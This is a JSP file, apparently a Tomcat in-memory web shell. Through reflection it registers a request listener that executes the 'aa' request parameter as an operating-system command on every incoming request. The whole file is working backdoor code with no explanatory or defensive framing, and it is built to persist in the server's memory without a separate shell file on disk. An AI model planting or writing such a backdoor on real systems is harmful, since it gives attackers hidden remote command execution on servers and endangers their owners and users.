<%@ page import="java.lang.reflect.Field" %>
<%@ page import="jdk.nashorn.internal.ir.RuntimeNode" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="Listener.ListenerTest" %>
<%@ page import="java.io.IOException" %>


<%!
    public class ListenerTest implements ServletRequestListener {
        public void requestInitialized(ServletRequestEvent sre)  {
            HttpServletRequest request = (HttpServletRequest)sre.getServletRequest();
            String cmd = request.getParameter("aa");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }
        public void requestDestroyed(ServletRequestEvent sre)  {

        }
    }
%>

<%
    // 注册监听器（只需执行一次）
    Field req =request.getClass().getDeclaredField("request");
    req.setAccessible(true);
    Request req1 = (Request) req.get(request);
    StandardContext context = (StandardContext)req1.getContext();
    ListenerTest linstentest = new ListenerTest();
    context.addApplicationEventListener(linstentest);
%>
